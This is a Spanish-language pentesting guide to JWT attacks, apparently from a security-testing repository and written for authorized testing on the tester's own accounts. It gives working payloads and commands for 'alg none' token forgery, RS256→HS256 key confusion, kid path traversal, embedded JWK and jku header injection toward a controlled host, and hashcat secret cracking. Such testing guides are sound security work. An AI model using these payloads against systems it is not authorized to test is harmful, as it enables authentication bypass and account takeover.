# 🗡️ Ataques contra JWT: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Firma inválida como control

**Objetivo:** Cambiar un claim de un token propio manteniendo la firma original.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {JWT_PROPIO_CLAIM_ALTERADO_FIRMA_ORIGINAL}
```

**Interpretación:** El servidor debe rechazarlo. Una respuesta idéntica a la válida exige comprobar que el claim modificado gobierna una decisión.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/jwt).

### 2. alg none

**Objetivo:** Crear un token sin firma para la identidad propia y comprobar rechazo.

```python
import base64, json
def b64(x): return base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).decode().rstrip('=')
header = {"alg":"none","typ":"JWT"}
claims = {"sub":"{ID_PROPIO}","iss":"{ISS}","aud":"{AUD}"}
print(b64(header)+"."+b64(claims)+".")
```

**Interpretación:** La tercera parte vacía conserva el punto final. Un 200 genérico no prueba aceptación del token.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/jwt).

### 3. Confusión RS256→HS256

**Objetivo:** En laboratorio con clave pública propia, verificar que el servidor fija el algoritmo esperado.

```bash
python3 jwt_tool.py '{JWT_PROPIO_RS256}' -X k -pk publickey.pem
```

**Interpretación:** La firma HS256 hecha con la clave pública solo debería aceptarse si existe confusión de algoritmos; conservar clave pública exacta.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md).

### 4. kid como ruta de clave

**Objetivo:** En laboratorio, probar si kid selecciona un archivo conocido como clave HMAC.

```bash
python3 jwt_tool.py '{JWT_PROPIO}' -I -hc kid -hv '../../dev/null' -S hs256 -p ''
```

**Interpretación:** El ejemplo depende de la ruta real y del verificador. Una respuesta distinta no prueba firma válida; confirmar con recurso propio.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md).

### 5. JWK embebida

**Objetivo:** Comprobar si el verificador acepta una clave pública incluida dentro del token.

```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"{KID_PROPIO}","n":"{MODULO_PUBLICO_PROPIO}","e":"AQAB"}}
```

**Interpretación:** Este header se firma con la privada correspondiente en laboratorio. El servidor debe usar su almacén de claves confiables.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/jwt).

### 6. jku hacia JWKS controlado

**Objetivo:** Probar si se busca una JWKS aportada por el token en un host propio.

```json
{"alg":"RS256","typ":"JWT","kid":"{KID_PROPIO}","jku":"https://{CONTROLLED_HOST}/jwks.json"}
```

**Interpretación:** La callback demuestra fetch, no bypass. Para validar aceptación, la JWKS y firma de laboratorio deben coincidir.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/jwt).

### 7. Secreto HS256 débil

**Objetivo:** Probar offline una lista pequeña de secretos de laboratorio contra un JWT propio.

```bash
hashcat -m 16500 jwt-propio.txt candidatos-lab.txt --quiet
```

**Interpretación:** No enviar tokens a servicios externos. Confirmar algoritmo HS256, coincidencia de firma y vigencia de la clave.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md).

### 8. Claims temporales y de contexto

**Objetivo:** Comparar rechazo de un token de prueba vencido o con audiencia distinta.

```json
{"sub":"{ID_PROPIO}","iss":"{ISS_ESPERADO}","aud":"{AUD_NO_PERMITIDA}","exp":1}
```

**Interpretación:** Requiere firma válida de laboratorio; exp, iss y aud se prueban uno por vez para atribuir el resultado.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc8725).

### 9. Uso antes de nbf

**Objetivo:** Firmar en laboratorio un JWT propio cuyo nbf esté en el futuro.

```json
{"sub":"{ID_PROPIO}","iss":"{ISS_ESPERADO}","aud":"{AUD_ESPERADA}","nbf":4102444800}
```

**Interpretación:** Conservar iss, aud y firma válidos para aislar nbf. El servidor debe rechazarlo antes del instante indicado.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.5).

### 10. Confusión entre tipos de token

**Objetivo:** Probar si una API acepta como access token un ID token propio emitido para el mismo cliente.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {ID_TOKEN_PROPIO_NO_ACCESS_TOKEN}
```

**Interpretación:** El ID token puede estar bien firmado y aun así tener público/propósito incorrecto. Confirmar rechazo y no registrar el token.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc8725).

### 11. jku con autoridad ambigua

**Objetivo:** Evaluar validación por prefijo de host de JWKS, solo con dominio y clave de laboratorio.

```json
{"alg":"RS256","kid":"{KID_PROPIO}","jku":"https://{HOST_JWKS_CONFIABLE}@{CONTROLLED_HOST}/jwks.json"}
```

**Interpretación:** El host real de esta URL es CONTROLLED_HOST. Fetch externo no equivale a aceptación: verificar firma y acceso con recurso propio.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/jwt).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
